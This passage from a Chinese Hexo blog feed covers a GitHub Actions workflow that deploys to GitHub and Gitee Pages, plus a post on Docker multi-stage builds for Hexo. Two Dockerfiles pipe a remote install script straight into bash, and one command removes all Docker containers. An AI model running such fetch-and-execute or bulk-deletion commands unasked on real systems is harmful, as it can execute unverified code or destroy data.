class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文件路径 .github/workflows/deployment.yml</span></span><br><span class="line"><span class="attr">name:</span> <span class="string">Deployment</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span> <span class="string">[hexo]</span> <span class="comment"># only push events on source branch trigger deployment</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">hexo-deployment:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">Hexo</span> <span class="string">deploy</span> <span class="string">to</span> <span class="string">GitHub</span> <span class="string">Pages</span> <span class="string">&amp;</span> <span class="string">Gitee</span> <span class="string">Pages</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">env:</span></span><br><span class="line">      <span class="attr">TZ:</span> <span class="string">Asia/Shanghai</span></span><br><span class="line">      <span class="attr">GIT_NAME:</span> <span class="string">yanzhe</span></span><br><span class="line">      <span class="attr">GIT_EMAIL:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GIT_EMAIL</span> <span class="string">&#125;&#125;</span></span><br><span class="line">      <span class="attr">REPO:</span> <span class="string">github.com/yanzhe/yanzhe.github.io</span></span><br><span class="line">      <span class="attr">GH_TOKEN:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GH_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">source</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">submodules:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Setup</span> <span class="string">Node.js</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">actions/setup-node@v1</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">node-version:</span> <span class="string">'12.x'</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Get</span> <span class="string">Latest</span> <span class="string">Commit</span> <span class="string">Message</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">        <span class="string">git</span> <span class="string">log</span> <span class="string">--pretty=format:"%s</span> <span class="string">from</span> <span class="string">Github</span> <span class="string">Actions</span> <span class="string">at</span> <span class="string">`date</span> <span class="string">+"%Y-%m-%d</span> <span class="string">%H:%M:%S"`"</span> <span class="string">--date=short</span> <span class="string">-n</span> <span class="number">1</span>  <span class="string">&gt;</span> <span class="string">commit-message.log</span></span><br><span class="line">        <span class="string">git</span> <span class="string">config</span> <span class="string">--global</span> <span class="string">user.name</span> <span class="string">$GIT_NAME</span></span><br><span class="line">        <span class="string">git</span> <span class="string">config</span> <span class="string">--global</span> <span class="string">user.email</span> <span class="string">$GIT_EMAIL</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Install</span> <span class="string">dependencies</span> <span class="string">&amp;</span> <span class="string">Generate</span> <span class="string">static</span> <span class="string">files</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">        <span class="string">node</span> <span class="string">-v</span></span><br><span class="line">        <span class="string">npm</span> <span class="string">i</span> <span class="string">-g</span> <span class="string">hexo-cli</span></span><br><span class="line">        <span class="string">npm</span> <span class="string">i</span></span><br><span class="line">        <span class="string">sed</span> <span class="string">-i</span> <span class="string">'18s/imageLink/imageLink.replace(\/\![0-9]&#123;3,&#125;x\/,"")/'</span> <span class="string">themes/next/source/js/utils.js</span></span><br><span class="line">        <span class="string">git</span> <span class="string">clone</span> <span class="string">https://$GH_TOKEN@$REPO</span> <span class="string">public</span></span><br><span class="line">        <span class="string">hexo</span> <span class="string">g</span></span><br><span class="line">    <span class="comment"># hexo clean &amp; hexo g</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Deploy</span> <span class="string">to</span> <span class="string">Github</span> <span class="string">Pages</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">        <span class="string">cd</span> <span class="string">./public</span> <span class="string">&amp;&amp;</span> <span class="string">git</span> <span class="string">init</span> <span class="string">&amp;&amp;</span> <span class="string">git</span> <span class="string">add</span> <span class="string">.</span></span><br><span class="line">        <span class="string">git</span> <span class="string">commit</span> <span class="string">-m</span> <span class="string">"Site deployed by GitHub Actions"</span></span><br><span class="line">        <span class="string">git</span> <span class="string">push</span> <span class="string">--force</span> <span class="string">--quiet</span> <span class="string">"https://$GH_TOKEN@$REPO"</span> <span class="string">master:master</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Deploy</span> <span class="string">to</span> <span class="string">Gitee</span> <span class="string">Pages</span></span><br><span class="line">      <span class="attr">env:</span></span><br><span class="line">        <span class="attr">ID_ED25519_GITEE:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.ID_ED25519_GITEE</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">GITEE_REPO:</span> <span class="string">gitee.com:yanzhe/yanzhe.git</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">        <span class="string">mkdir</span> <span class="string">-p</span> <span class="string">~/.ssh/</span></span><br><span class="line">        <span class="string">echo</span> <span class="string">"$&#123;ID_ED25519_GITEE&#125;"</span> <span class="string">&gt;</span> <span class="string">~/.ssh/id_ed25519_gitee</span></span><br><span class="line">        <span class="string">chmod</span> <span class="number">600</span> <span class="string">~/.ssh/id_ed25519_gitee</span></span><br><span class="line">        <span class="string">ssh-keyscan</span> <span class="string">gitee.com</span> <span class="string">&gt;&gt;</span> <span class="string">~/.ssh/known_hosts</span></span><br><span class="line">        <span class="string">ssh-keyscan</span> <span class="string">e.coding.net</span> <span class="string">&gt;&gt;</span> <span class="string">~/.ssh/known_hosts</span></span><br><span class="line">        <span class="string">echo</span> <span class="string">"Host gitee.com"</span> <span class="string">&gt;&gt;</span> <span class="string">~/.ssh/config</span></span><br><span class="line">        <span class="string">echo</span> <span class="string">" HostName gitee.com"</span> <span class="string">&gt;&gt;</span> <span class="string">~/.ssh/config</span></span><br><span class="line">        <span class="string">echo</span> <span class="string">" User $&#123;GIT_NAME&#125;"</span> <span class="string">&gt;&gt;</span> <span class="string">~/.ssh/config</span></span><br><span class="line">        <span class="string">echo</span> <span class="string">" PreferredAuthentications publickey"</span> <span class="string">&gt;&gt;</span> <span class="string">~/.ssh/config</span></span><br><span class="line">        <span class="string">echo</span> <span class="string">" IdentityFile ~/.ssh/id_ed25519_gitee"</span> <span class="string">&gt;&gt;</span> <span class="string">~/.ssh/config</span></span><br><span class="line">        <span class="string">git</span> <span class="string">rm</span> <span class="string">-rf</span> <span class="string">--cached</span> <span class="string">--ignore-unmatch</span> <span class="string">./public</span></span><br><span class="line">        <span class="string">git</span> <span class="string">clone</span> <span class="string">git@$&#123;GITEE_REPO&#125;</span> <span class="string">gitee_blog</span></span><br><span class="line">        <span class="string">cd</span> <span class="string">gitee_blog</span></span><br><span class="line">        <span class="string">git</span> <span class="string">checkout</span> <span class="string">master</span></span><br><span class="line">        <span class="string">cd</span> <span class="string">../</span></span><br><span class="line">        <span class="string">\cp</span> <span class="string">-rf</span> <span class="string">./public</span> <span class="string">./gitee_blog/</span></span><br><span class="line">        <span class="string">cd</span> <span class="string">gitee_blog</span></span><br><span class="line">        <span class="string">git</span> <span class="string">add</span> <span class="string">.</span></span><br><span class="line">        <span class="string">git</span> <span class="string">commit</span> <span class="string">-F</span> <span class="string">../commit-message.log</span></span><br><span class="line">        <span class="string">git</span> <span class="string">push</span> <span class="string">--force</span> <span class="string">--quiet</span> <span class="string">"git@$&#123;GITEE_REPO&#125;"</span> <span class="string">master:master</span></span><br></pre></td></tr></table></figure><p>GitHub 发现了 workflow 文件以后，就会自动运行。你可以在网站上实时查看<a href="https://github.com/ruanyf/github-actions-demo/commit/24fbf6a875351297f31434fd44bc3146accf9e59/checks">运行日志</a>，日志默认保存30天。</p><p>等到 workflow 运行结束，访问 <a href="https://ruanyf.github.io/github-actions-demo/">GitHub Page</a>，会看到构建成果已经发上网了。</p><p>以后，每次修改后推送源码，GitHub Actions 都会自动运行，将构建产物发布到网页。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">status</span></span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">"尝试推送到Gitee"</span></span><br><span class="line">git <span class="built_in">push</span> <span class="built_in">origin</span> hexo</span><br></pre></td></tr></table></figure><p><a href="http://www.ruanyifeng.com/blog/2019/09/getting-started-with-github-actions.html">参考链接 - GitHub Actions 入门教程</a></p>]]></content>
    
    <summary type="html">
    
      GitHub Actions 是 GitHub 的持续集成服务，于2018年10月推出。使用 Hexo 作为示例
    
    </summary>
    
    
      <category term="CI/CD" scheme="https://blog.yanzhe.tk/categories/ci-cd/"/>
    
      <category term="Hexo" scheme="https://blog.yanzhe.tk/categories/ci-cd/hexo/"/>
    
    
      <category term="Hexo" scheme="https://blog.yanzhe.tk/tags/hexo/"/>
    
      <category term="GitHub Actions" scheme="https://blog.yanzhe.tk/tags/github-actions/"/>
    
      <category term="CI/CD" scheme="https://blog.yanzhe.tk/tags/ci-cd/"/>
    
      <category term="workflows" scheme="https://blog.yanzhe.tk/tags/workflows/"/>
    
  </entry>
  
  <entry>
    <title>Docker 多阶段构建示例 + Docker Hexo</title>
    <link href="https://blog.yanzhe.tk/2020/06/13/use-docker-multi-stage-build/"/>
    <id>https://blog.yanzhe.tk/2020/06/13/use-docker-multi-stage-build/</id>
    <published>2020-06-13T00:23:03.000Z</published>
    <updated>2020-08-23T01:48:10.235Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><h2 id="拉取hexo-source-post-的分支"><a href="#拉取hexo-source-post-的分支" class="headerlink" title="拉取hexo source/_post 的分支"></a>拉取hexo source/_post 的分支</h2><blockquote><p><code>hexo</code> 分支为 hexo markdown 源码分支</p></blockquote><p><code>git pull origin hexo</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ~/hexo/source</span><br><span class="line">cd ~/hexo/source</span><br><span class="line">git init</span><br><span class="line">git pull https://github.com/yanzhe919/yanzhe919.github.io.git hexo:hexo</span><br></pre></td></tr></table></figure><blockquote><ul><li>顺便解释一下， <code>git pull origin hexo</code> 相当于 <code>git fetch origin hexo</code> + <code>git checkout -b hexo origin/hexo</code></li></ul></blockquote><ul><li><code>cd ~/hexo</code> ，以下操作都在 <code>~/hexo</code> 下执行</li></ul><h1 id="以前正常使用-Dockerfile-，如-node-lts"><a href="#以前正常使用-Dockerfile-，如-node-lts" class="headerlink" title="以前正常使用 Dockerfile ，如 node:lts"></a>以前正常使用 Dockerfile ，如 node:lts</h1><h2 id="编辑并创建-Dockerfile-，-vim-Dockerfile-lts"><a href="#编辑并创建-Dockerfile-，-vim-Dockerfile-lts" class="headerlink" title="编辑并创建 Dockerfile ， vim Dockerfile_lts"></a>编辑并创建 Dockerfile ， vim Dockerfile_lts</h2><p><code>vim Dockerfile_lts</code></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:lts as build</span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> maintainer=<span class="string">"yan zhe &lt;yanzhe919@gmail.com&gt;"</span></span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /hexo</span></span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> [<span class="string">"/hexo"</span>]</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> npm install hexo-cli -g</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">4000</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> []</span></span><br></pre></td></tr></table></figure><h2 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h2><p><code>docker build -t hexo-blog:0.0.1 -f ~/hexo/Dockerfile_lts .</code></p><blockquote><p>镜像大概 933MB</p></blockquote><h2 id="安装插件，-package-json"><a href="#安装插件，-package-json" class="headerlink" title="安装插件， package.json"></a>安装插件， package.json</h2><p><code>docker run -it --rm -v ~/hexo/source:/hexo hexo-blog:0.0.1 sh -c &quot;cd /hexo;npm install&quot;</code></p><blockquote><p>有些插件可能需要从源码编译，但是 lts 版本带了很多编译工具</p></blockquote><h2 id="测试，生成并显示页面"><a href="#测试，生成并显示页面" class="headerlink" title="测试，生成并显示页面"></a>测试，生成并显示页面</h2><p><code>docker run -it --rm -p 80:4000 -v ~/hexo/source:/hexo hexo-blog:0.0.1 sh -c &quot;cd /hexo;hexo generate &amp;&amp; hexo server&quot;</code></p><h1 id="正在使用的-Dockerfile-，如-node-alpine"><a href="#正在使用的-Dockerfile-，如-node-alpine" class="headerlink" title="正在使用的 Dockerfile ，如 node:alpine"></a>正在使用的 Dockerfile ，如 node:alpine</h1><h2 id="编辑并创建-Dockerfile-，-vim-Dockerfile-alpine"><a href="#编辑并创建-Dockerfile-，-vim-Dockerfile-alpine" class="headerlink" title="编辑并创建 Dockerfile ， vim Dockerfile_alpine"></a>编辑并创建 Dockerfile ， vim Dockerfile_alpine</h2><p><code>vim Dockerfile_alpine</code></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:lts-alpine as build</span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> maintainer=<span class="string">"yan zhe &lt;yanzhe919@gmail.com&gt;"</span></span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apk update &amp;&amp; apk upgrade &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apk add --no-cache git</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> npm add hexo-cli -g</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">4000</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> []</span></span><br></pre></td></tr></table></figure><h2 id="构建镜像-1"><a href="#构建镜像-1" class="headerlink" title="构建镜像"></a>构建镜像</h2><p><code>docker build -t hexo-blog:0.0.3 -f ~/hexo/Dockerfile_alpine .</code></p><blockquote><p>镜像大概 123MB</p></blockquote><h2 id="安装插件，-package-json-1"><a href="#安装插件，-package-json-1" class="headerlink" title="安装插件， package.json"></a>安装插件， package.json</h2><p><code>docker run -it --rm -v ~/hexo/source:/hexo hexo-blog:0.0.3 sh -c &quot;cd /hexo;npm install&quot;</code></p><blockquote><p>有些插件可能需要从源码编译，需要使用 <code>apk add</code> 先进行安装编译工具 ，如我正在使用的插件</p></blockquote><p><code>docker run -it --rm -v ~/hexo/source:/hexo hexo-blog:0.0.3 sh -c &quot;apk add --no-cache autoconf automake build-base libtool nasm pkgconfig libjpeg-turbo;cd /hexo;npm install&quot;</code></p><h2 id="测试，生成并显示页面-1"><a href="#测试，生成并显示页面-1" class="headerlink" title="测试，生成并显示页面"></a>测试，生成并显示页面</h2><p><code>docker run -d --name hexo -p 80:4000 -v ~/hexo/source:/hexo hexo-blog:0.0.3 sh -c &quot;cd /hexo; hexo generate &amp;&amp; hexo server&quot;</code></p><blockquote><p>顺便使用 -d 后台运行。</p></blockquote><p>查看日志</p><p><code>docker logs hexo</code></p><p>删除容器</p><p><code>docker rm hexo</code></p><blockquote><p>删除前如还在运行，最好是先停止 <code>docker stop hexo</code> ，当然有把握，可以 force 直接删除 <code>-f</code></p></blockquote><h1 id="多阶段构建-multi-stage-build"><a href="#多阶段构建-multi-stage-build" class="headerlink" title="多阶段构建(multi-stage build)"></a>多阶段构建(multi-stage build)</h1><p>以上都为顺便的记录。主要是想看看 Docker 多阶段构建(multi-stage build) 。只是使用 Hexo 作为示例，但是它并不是很适合。可以直接使用 <code>Github Action</code> 工作流自动化部署。</p><h1 id="Multi-stage-Dockerfile-，如-node-lts-编译，node-lts-slim-运行"><a href="#Multi-stage-Dockerfile-，如-node-lts-编译，node-lts-slim-运行" class="headerlink" title="Multi-stage Dockerfile ，如 node:lts 编译，node:lts_slim 运行"></a>Multi-stage Dockerfile ，如 node:lts 编译，node:lts_slim 运行</h1><h2 id="编辑并创建-Dockerfile-，-vim-Dockerfile-lts-build"><a href="#编辑并创建-Dockerfile-，-vim-Dockerfile-lts-build" class="headerlink" title="编辑并创建 Dockerfile ， vim Dockerfile_lts_build"></a>编辑并创建 Dockerfile ， vim Dockerfile_lts_build</h2><blockquote><p>这里只是示例，就直接将 <code>package.json</code> 打包进镜像中了。构建镜像中安装插件</p></blockquote><p><code>vim Dockerfile_lts_build</code></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:lts as build</span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> maintainer=<span class="string">"yan zhe &lt;yanzhe919@gmail.com&gt;"</span></span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /hexo</span></span><br><span class="line"><span class="keyword">ARG</span> package=package.json</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> <span class="variable">$package</span> ./</span></span><br><span class="line"><span class="comment"># install node-prune (https://github.com/tj/node-prune)</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> curl -sfL https://install.goreleaser.com/github.com/tj/node-prune.sh | bash -s -- -b /usr/<span class="built_in">local</span>/bin</span></span><br><span class="line"><span class="comment">#RUN yarn install --production=true</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> npm install</span></span><br><span class="line"><span class="comment"># remove development dependencies</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> npm prune --production</span></span><br><span class="line"><span class="keyword">FROM</span> node:lts-slim</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> --from=build /hexo /hexo</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> npm install hexo-cli -g</span></span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> [<span class="string">"/hexo"</span>]</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">4000</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> []</span></span><br></pre></td></tr></table></figure><blockquote><p>使用 <code>node-prune</code> 本来是想进一步缩小镜像，但是实际测试中，似乎并没有，可能 Hexo Demo 不行。感兴趣的可以看下 <a href="https://medium.com/trendyol-tech/how-we-reduce-node-docker-image-size-in-3-steps-ff2762b51d5a">三步缩小Node镜像</a></p></blockquote><h2 id="构建镜像-2"><a href="#构建镜像-2" class="headerlink" title="构建镜像"></a>构建镜像</h2><p><code>docker build --build-arg package=source/package.json -t hexo-blog:0.0.2 --no-cache -f ~/hexo/Dockerfile_lts_build .</code></p><blockquote><p><code>--no-cache=true</code> ，将中间生成的 cache 构建后删除。来自 <a href="https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#leverage-build-cache">官方最佳实践</a>。不过，还是建议测试 build 时候不要加上</p></blockquote><blockquote><p>如果没加，需要删除缓存 <code>docker image prune -f</code></p></blockquote><blockquote><p>镜像大概 330MB</p></blockquote><h2 id="拷贝镜像中文件，已安装的插件"><a href="#拷贝镜像中文件，已安装的插件" class="headerlink" title="拷贝镜像中文件，已安装的插件"></a>拷贝镜像中文件，已安装的插件</h2><p><code>docker run --name hexo hexo-blog:0.0.2</code></p><p><code>docker cp hexo:/hexo/node_modules ~/hexo/source/</code></p><blockquote><p>此时容器已停止，<code>docker cp</code> 一样可用</p></blockquote><h2 id="测试，生成并显示页面-2"><a href="#测试，生成并显示页面-2" class="headerlink" title="测试，生成并显示页面"></a>测试，生成并显示页面</h2><p><code>docker run -it --rm -p 80:4000 -v ~/hexo/source:/hexo hexo-blog:0.0.2 sh -c &quot;cd /hexo;hexo generate &amp;&amp; hexo server&quot;</code></p><h1 id="Multi-stage-Dockerfile-，如-node-lts-alpine-编译，另一个-node-lts-alpine-运行"><a href="#Multi-stage-Dockerfile-，如-node-lts-alpine-编译，另一个-node-lts-alpine-运行" class="headerlink" title="Multi-stage Dockerfile ，如 node:lts-alpine 编译，另一个 node:lts-alpine 运行"></a>Multi-stage Dockerfile ，如 node:lts-alpine 编译，另一个 node:lts-alpine 运行</h1><h2 id="编辑并创建-Dockerfile-，-vim-Dockerfile-alpine-build"><a href="#编辑并创建-Dockerfile-，-vim-Dockerfile-alpine-build" class="headerlink" title="编辑并创建 Dockerfile ， vim Dockerfile_alpine_build"></a>编辑并创建 Dockerfile ， vim Dockerfile_alpine_build</h2><blockquote><p>这里只是示例，就直接将 <code>package.json</code> 打包进镜像中了。构建镜像中安装插件</p></blockquote><p><code>vim Dockerfile_alpine_build</code></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:lts-alpine as build</span><br><span class="line"><span class="keyword">LABEL</span><span class="bash"> maintainer=<span class="string">"yan zhe &lt;yanzhe919@gmail.com&gt;"</span></span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /hexo</span></span><br><span class="line"><span class="keyword">ARG</span> package=package.json</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> <span class="variable">$package</span> ./</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apk update &amp;&amp; apk upgrade &amp;&amp; \</span></span><br><span class="line"><span class="bash">apk add --no-cache git curl &amp;&amp; \</span></span><br><span class="line"><span class="bash">apk add --no-cache autoconf automake build-base libtool nasm pkgconfig libjpeg-turbo</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> npm add hexo-cli -g &amp;&amp; \</span></span><br><span class="line"><span class="bash">npm install --save</span></span><br><span class="line"><span class="comment"># install node-prune (https://github.com/tj/node-prune)</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> curl -sfL https://install.goreleaser.com/github.com/tj/node-prune.sh | bash -s -- -b /usr/<span class="built_in">local</span>/bin</span></span><br><span class="line"><span class="comment">#RUN yarn install --production=true</span></span><br><span class="line"><span class="comment"># remove development dependencies</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> npm prune --production</span></span><br><span class="line"><span class="keyword">FROM</span> node:lts-alpine</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> --from=build /hexo /hexo</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> npm install hexo-cli -g</span></span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> [<span class="string">"/hexo"</span>]</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">4000</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> []</span></span><br></pre></td></tr></table></figure><blockquote><p>使用 <code>node-prune</code> 本来是想进一步缩小镜像，但是实际测试中，似乎并没有，可能 Hexo Demo 不行。感兴趣的可以看下 <a href="https://medium.com/trendyol-tech/how-we-reduce-node-docker-image-size-in-3-steps-ff2762b51d5a">三步缩小Node镜像</a></p></blockquote><h2 id="构建镜像-3"><a href="#构建镜像-3" class="headerlink" title="构建镜像"></a>构建镜像</h2><p><code>docker build --build-arg package=source/package.json -t hexo-blog:0.0.4 --no-cache -f ~/hexo/Dockerfile_alpine_build .</code></p><blockquote><p><code>--no-cache=true</code> ，将中间生成的 cache 构建后删除。来自 <a href="https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#leverage-build-cache">官方最佳实践</a>。不过，还是建议测试 build 时候不要加上</p></blockquote><blockquote><p>如果没加，需要删除缓存 <code>docker image prune -f</code></p></blockquote><blockquote><p>镜像大概 300MB</p></blockquote><h2 id="拷贝镜像中文件，已安装的插件-1"><a href="#拷贝镜像中文件，已安装的插件-1" class="headerlink" title="拷贝镜像中文件，已安装的插件"></a>拷贝镜像中文件，已安装的插件</h2><p><code>docker run --name hexo hexo-blog:0.0.4</code></p><p><code>docker cp hexo:/hexo/node_modules ~/hexo/source/</code></p><blockquote><p>此时容器已停止，<code>docker cp</code> 一样可用</p></blockquote><h2 id="测试，生成并显示页面-3"><a href="#测试，生成并显示页面-3" class="headerlink" title="测试，生成并显示页面"></a>测试，生成并显示页面</h2><p><code>docker run -it --rm -p 80:4000 -v ~/hexo/source:/hexo hexo-blog:0.0.4 sh -c &quot;cd /hexo;hexo generate &amp;&amp; hexo server&quot;</code></p><h1 id="Docker-Hexo-其他命令"><a href="#Docker-Hexo-其他命令" class="headerlink" title="Docker Hexo 其他命令"></a>Docker Hexo 其他命令</h1><p>在多阶段构建(multi-stage build)中，如果没有加 <code>--no-cache</code> ，除了<code>&lt;none&gt;</code> 镜像，可能还会产生一些已停止的容器</p><h2 id="同时删除多个符合筛选条件的-docker-容器"><a href="#同时删除多个符合筛选条件的-docker-容器" class="headerlink" title="同时删除多个符合筛选条件的 docker 容器"></a>同时删除多个符合筛选条件的 docker 容器</h2><p>如：删除已停止的容器</p><p><code>docker rm $(docker container ls -f &quot;status=exited&quot; -q)</code></p><h2 id="删除所有容器"><a href="#删除所有容器" class="headerlink" title="删除所有容器"></a>删除所有容器</h2><p><code>docker rm $(docker container ls -aq)</code></p><h2 id="Docker-Hexo-新增-markdown"><a href="#Docker-Hexo-新增-markdown" class="headerlink" title="Docker Hexo 新增 markdown"></a>Docker Hexo 新增 markdown</h2><p><code>docker run -it --rm -p 4000:4000 -v ~/hexo/source:/hexo hexo-blog:alpine sh -c &quot;cd /hexo;hexo new &#39;use docker multi-stage build&#39;&quot;</code></p><h2 id="Docker-Hexo-根据-markdown-生成页面"><a href="#Docker-Hexo-根据-markdown-生成页面" class="headerlink" title="Docker Hexo 根据 markdown 生成页面"></a>Docker Hexo 根据 markdown 生成页面</h2><p><code>docker run -it --rm -p 80:4000 -v ~/hexo/source:/hexo hexo-blog:alpine sh -c &quot;cd /hexo;hexo generate&quot;</code></p><h2 id="Docker-Hexo-根据-markdown-清理并生成页面"><a href="#Docker-Hexo-根据-markdown-清理并生成页面" class="headerlink" title="Docker Hexo 根据 markdown 清理并生成页面"></a>Docker Hexo 根据 markdown 清理并生成页面</h2><p><code>docker run -it --rm -p 4000:4000 -v ~/hexo/source:/hexo hexo-blog:alpine sh -c &quot;cd /hexo;hexo clean &amp;&amp; hexo generate&quot;</code></p><h2 id="Docker-Hexo-初始化"><a href="#Docker-Hexo-初始化" class="headerlink" title="Docker Hexo 初始化"></a>Docker Hexo 初始化</h2><p><code>docker run -it --rm -p 4000:4000 -v ~/hexo/source:/hexo hexo-blog:alpine sh -c “cd /hexo;hexo init blog”</code></p><h1 id="Github-Action-自动化构建-Hexo"><a href="#Github-Action-自动化构建-Hexo" class="headerlink" title="Github Action 自动化构建 - Hexo"></a>Github Action 自动化构建 - Hexo</h1><p>另外写一篇好了 Github Action 自动化构建 - Hexo</p>]]></content>
    
    <summary type="html">
    
      多阶段构建(multi-stage build) ，如可使用 `alpine` ，再 `apk add` 一些相关编译包进行编译，最后缩小镜像 。使用 Hexo 作为示例
    
    </summary>
    
    
      <category term="Docker" scheme="https://blog.yanzhe.tk/categories/docker/"/>
    
      <category term="Hexo" scheme="https://blog.yanzhe.tk/categories/docker/hexo/"/>
    
    
      <category term="Docker" scheme="https://blog.yanzhe.tk/tags/docker/"/>
    
      <category term="Hexo" scheme="https://blog.yanzhe.tk/tags/hexo/"/>
    
      <category term="multi-stage build" scheme="https://blog.yanzhe.tk/tags/multi-stage-build/"/>
    
      <category term="多阶段构建" scheme="https://blog.yanzhe.tk/tags/%E5%A4%9A%E9%98%B6%E6%AE%B5%E6%9E%84%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>在VM中安装RancherOS使用Docker</title>
